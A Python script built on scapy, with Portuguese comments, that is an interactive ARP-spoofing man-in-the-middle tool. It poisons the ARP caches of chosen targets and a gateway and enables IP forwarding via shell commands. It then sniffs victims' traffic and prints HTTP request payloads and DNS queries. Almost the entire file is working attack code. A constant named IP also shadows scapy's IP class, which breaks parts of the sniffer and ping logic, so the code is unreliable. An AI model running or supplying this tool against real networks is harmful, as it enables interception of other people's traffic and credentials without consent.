import sys
import argparse
import threading
import queue
import time
import os
from scapy.all import *

IP = CMD = 0
MAC = TARGET = 1


def parse_args():
    parser = argparse.ArgumentParser(description='O envenenamento por ARP ocorre entre ' + 'um portal e vários ' + 'alvos')
    parser.add_argument('-i', '--interface', dest='interface', help='interface para enviar')
    parser.add_argument('-t', '--targets', dest='targets', help='lista de endereços IP separados por vírgulas', required=True)
    parser.add_argument('-g', '--gateway', dest='gateway', help='Endereço IP do gateway', required=True)
    return parser.parse_args()


def get_working_if():
    """Retorna a primeira interface que funciona, excluindo lo (loopback)"""
    ifaces = get_if_list()
    for iface in ifaces:
        if iface != 'lo' and is_interface_valid(iface):
            return iface
    raise Exception('Nenhuma interface válida encontrada')


def is_interface_valid(iface):
    """Verifica se a interface é válida"""
    try:
        ip = get_if_addr(iface)
        if ip != '0.0.0.0' and ip != '127.0.0.1':
            return True
    except:
        pass
    return False


def get_MAC(interface, target_IP):
    source_IP = get_if_addr(interface)
    source_MAC = get_if_hwaddr(interface)
    p = ARP(hwsrc=source_MAC, psrc=source_IP) # type: ignore
    p.hwdst = 'ff:ff:ff:ff:ff:ff'
    p.pdst = target_IP
    reply, unans = sr(p, timeout=10, verbose=0)
    if len(reply) == 0:
        raise Exception('Erro ao encontrar MAC para %s, tente usar -i' % target_IP)
    return reply[0][1].hwsrc


def get_MAC_alternative(interface, target_IP):
    """Tenta obter o MAC sem falhar, usando broadcast se necessário"""
    try:
        # Método 1: Tenta obter normalmente
        return get_MAC(interface, target_IP)
    except Exception:
        print(f"Aviso: Impossível obter MAC para {target_IP}, usando MAC de broadcast")
        # Retorna endereço de broadcast como alternativa
        return "ff:ff:ff:ff:ff:ff"


def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
    finish = False

    while not finish:
        # Enviar pacotes ARP falsificados
        for t in targets:
            send_ARP_alternative(t[IP], t[MAC], gateway[IP], attacker_MAC)
            send_ARP_alternative(gateway[IP], gateway[MAC], t[IP], attacker_MAC)
        time.sleep(1)
        
        # Verificar comandos na fila
        try:
            if not control_queue.empty():
                item = control_queue.get(block=False)
                cmd = item[CMD].lower()
                
                if cmd in ['quit', 'exit', 'stop', 'leave']:
                    finish = True

                elif cmd in ['add', 'insert']:
                    targets.append(item[TARGET])

                elif cmd in ['del', 'delete', 'remove']:
                    try:
                        targets.remove(item[TARGET])
                        restore_ARP_caches([item[TARGET]], gateway, False)
                    except ValueError:
                        print("%s não está na lista de alvos" % item[TARGET][0])

                elif cmd in ['list', 'show', 'status']:
                    print('Metas atuais:')
                    print('Gateway: %s (%s)' % gateway)
                    for t in targets:
                        print("%s (%s)" % t)
        except queue.Empty:
            pass  # Fila vazia, continuar o loop

    restore_ARP_caches(targets, gateway)


def restore_ARP_caches(targets, gateway, verbose=True):
    print('Parando o ataque, restaurando o cache ARP')
    for i in range(3):
        if verbose:
            print("ARP %s está em %s" % (gateway[IP], gateway[MAC]))
        for t in targets:
            if verbose:
                print("ARP %s is at %s" % (t[IP], t[MAC]))
            send_ARP_alternative(t[IP], t[MAC], gateway[IP], gateway[MAC])
            send_ARP_alternative(gateway[IP], gateway[MAC], t[IP], t[MAC])
        time.sleep(1)
    print('Caches ARP restaurados')


def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC):
    """Sempre usa sendp() com frame Ethernet completo para evitar avisos"""
    print(f"Enviando ARP para: IP={destination_IP}")
    # Sempre usar Ether + ARP para evitar o aviso
    arp_packet = Ether(dst=destination_MAC)/ARP(op=2, pdst=destination_IP, hwdst=destination_MAC,
                   psrc=source_IP, hwsrc=source_MAC)
    sendp(arp_packet, verbose=0)  # Usar sendp em vez de send


def send_ARP_alternative(destination_IP, destination_MAC, source_IP, source_MAC):
    """Envia pacote ARP usando Ethernet broadcast se necessário"""
    print(f"Enviando ARP para: IP={destination_IP}")
    
    # Sempre usar frame Ethernet completo com sendp()
    arp_packet = Ether(dst=destination_MAC)/ARP(op=2, pdst=destination_IP, 
                   hwdst=destination_MAC, psrc=source_IP, hwsrc=source_MAC)
    sendp(arp_packet, verbose=0)


def packet_callback(packet, targets, gateway):
    """Função de callback para analisar pacotes capturados"""
    print(f"\n[DEBUG] Pacote recebido: {packet.summary()}")
    
    if IP in packet:
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        
        # Verifica se o pacote é relevante (entre alvos e gateway)
        is_from_target = any(ip_src == t[IP] for t in targets)
        is_to_target = any(ip_dst == t[IP] for t in targets)
        is_from_gateway = (ip_src == gateway[IP])
        is_to_gateway = (ip_dst == gateway[IP])
        
        if (is_from_target and is_to_gateway) or (is_from_gateway and is_to_target):
            print(f"\n[*] Pacote interceptado: {ip_src} -> {ip_dst}")
            
            # Análise básica de protocolos comuns
            if TCP in packet:
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport
                print(f"    TCP {src_port} -> {dst_port}")
                
                # Detecta serviços comuns
                if dst_port == 80:
                    print("    [HTTP]")
                    if packet.haslayer(Raw):
                        try:
                            payload = packet[Raw].load.decode('utf-8', errors='ignore')
                            if "GET" in payload or "POST" in payload:
                                print(f"    Dados: {payload[:100]}...")
                        except:
                            pass
                
                elif dst_port == 443:
                    print("    [HTTPS]")
                
            elif UDP in packet:
                src_port = packet[UDP].sport
                dst_port = packet[UDP].dport
                print(f"    UDP {src_port} -> {dst_port}")
                
                if dst_port == 53:
                    print("    [DNS]")
                    if packet.haslayer(DNSQR):
                        qname = packet[DNSQR].qname.decode('utf-8')
                        print(f"    Query: {qname}")
            
            elif ICMP in packet:
                print("    [ICMP]")


def start_sniffer(interface, targets, gateway):
    """Inicia um sniffer de pacotes mais genérico para capturar tráfego"""
    print(f"[*] Iniciando sniffer na interface {interface}")
    
    # Criar filtro mais simples para capturar mais pacotes
    target_ips = [t[IP] for t in targets]
    
    # Filtro simplificado - capturar qualquer pacote IP (não apenas ARP)
    # excluindo os próprios pacotes ARP de envenenamento
    filter_expr = "ip and not arp"
    
    print(f"[*] Filtro de captura: {filter_expr}")
    
    # Iniciar o sniffer com armazenamento para debug
    t = AsyncSniffer(
        iface=interface,
        prn=lambda pkt: packet_callback(pkt, targets, gateway),
        filter=filter_expr,
        store=True,
        count=0
    )
    t.start()
    print(f"[*] Sniffer iniciado. Capturando pacotes...")
    return t


def enable_ip_forwarding():
    """Ativa o IP forwarding para permitir que os pacotes passem pela máquina atacante"""
    print("[*] Ativando IP forwarding...")
    if sys.platform == "win32":
        # No Windows, podemos tentar, mas pode requerer privilégios de administrador
        os.system("reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f")
        os.system("netsh int ip set global forwarding=enabled")
        print("[*] Execute o script como administrador para garantir IP forwarding")
    else:
        # Linux
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
    print("[*] IP forwarding ativado")


def main():
    # Ative o IP forwarding logo no início do main()
    enable_ip_forwarding()

    args = parse_args()
    control_queue = queue.Queue()

    # 1. Obtenha a interface e o MAC do atacante
    interface = args.interface or get_working_if()
    attacker_MAC = get_if_hwaddr(interface)
    print('Usando a interface %s (%s)' % (interface, attacker_MAC))
    
    # 2. Obtenha os alvos usando o método alternativo para não falhar
    try:
        targets = [(t.strip(), get_MAC_alternative(interface, t.strip())) for t in
                  args.targets.split(',')]
    except Exception as e:
        print(e)
        sys.exit(1)

    # 3. Obtenha o gateway usando o método alternativo
    try:
        gateway = (args.gateway, get_MAC_alternative(interface, args.gateway))
    except Exception as e:
        print(e)
        sys.exit(2)
    
    # 4. Inicie a thread de envenenamento ARP
    poison_thread = threading.Thread(target=start_poison_thread,
                                   args=(targets, gateway, control_queue,
                                         attacker_MAC))
    poison_thread.daemon = True
    poison_thread.start()
    
    # 5. Inicie o sniffer de pacotes
    sniffer = start_sniffer(interface, targets, gateway)
    print("[*] Sniffer iniciado. Capturando pacotes...")
    
    # Após iniciar o sniffer, mas antes do loop de comandos:
    print("\n[*] Sistema configurado:")
    print(f"  - Atacante: {interface} ({attacker_MAC})")
    print(f"  - Gateway: {gateway[IP]} ({gateway[MAC]})")
    print("  - Alvos:")
    for t in targets:
        print(f"    * {t[IP]} ({t[MAC]})")
    print("\n[*] Se não estiver vendo pacotes capturados:")
    print("  1. Verifique se está executando como administrador")
    print("  2. Verifique se o IP forwarding está ativado")
    print("  3. Tente gerar tráfego de rede nos alvos (navegação web, ping)")
    print("  4. Use o comando 'stats' para ver estatísticas de captura")
    
    # 6. Loop principal de comandos
    try:
        while poison_thread.is_alive():
            try:
                command = input('arpspoof# ').split()
                if command:
                    cmd = command[CMD].lower()
                    if cmd in ['help', '?']:
                        print("add <IP>: adiciona endereço IP à lista de alvos\n" +
                              "del <IP>: remove endereço IP da lista de alvos\n" +
                              "list: imprime todos os alvos atuais\n" +
                              "exit: interrompe o envenenamento e sai")

                    elif cmd in ['quit', 'exit', 'stop', 'leave']:
                        control_queue.put(('quit',))
                        poison_thread.join(timeout=5)
                        break

                    elif cmd in ['add', 'insert']:
                        if len(command) > 1:
                            ip = command[TARGET]
                            print("IP: " + ip)
                            try:
                                t = (ip, get_MAC(interface, ip))
                                control_queue.put((cmd, t))
                            except Exception as e:
                                print('Não foi possível adicionar %s' % ip)
                                print(e)
                        else:
                            print("Erro: IP não especificado")

                    elif cmd in ['del', 'delete', 'remove']:
                        if len(command) > 1:
                            ip = command[TARGET]
                            try:
                                t = (ip, get_MAC(interface, ip))
                                control_queue.put((cmd, t))
                            except Exception as e:
                                print('Não foi possível remover %s' % ip)
                                print(e)
                        else:
                            print("Erro: IP não especificado")

                    elif cmd in ['list', 'show', 'status']:
                        control_queue.put((cmd,))

                    elif cmd in ['stats', 'statistics']:
                        print(f"[*] Estatísticas do sniffer:")
                        if hasattr(sniffer, 'results'):
                            packets = len(sniffer.results)
                            print(f"  - Pacotes capturados: {packets}")
                            if packets > 0:
                                print(f"  - Tipos de pacotes:")
                                tcp = sum(1 for p in sniffer.results if TCP in p)
                                udp = sum(1 for p in sniffer.results if UDP in p)
                                icmp = sum(1 for p in sniffer.results if ICMP in p)
                                print(f"    * TCP: {tcp}")
                                print(f"    * UDP: {udp}")
                                print(f"    * ICMP: {icmp}")
                        else:
                            print("  - Nenhum pacote capturado ainda")

                    elif cmd in ['ping', 'test']:
                        if len(targets) > 0:
                            target = targets[0][IP]
                            print(f"[*] Testando conexão com {target}...")
                            ping_packet = IP(dst=target)/ICMP()
                            send(ping_packet, verbose=0)
                            print(f"[*] Pacote de teste enviado para {target}")
            except EOFError:
                break

    except KeyboardInterrupt:
        print("\nInterrompendo o ataque...")
        control_queue.put(('quit',))
        poison_thread.join(timeout=5)
        sniffer.stop()  # Para o sniffer quando o programa termina

if __name__ == '__main__':
    main()
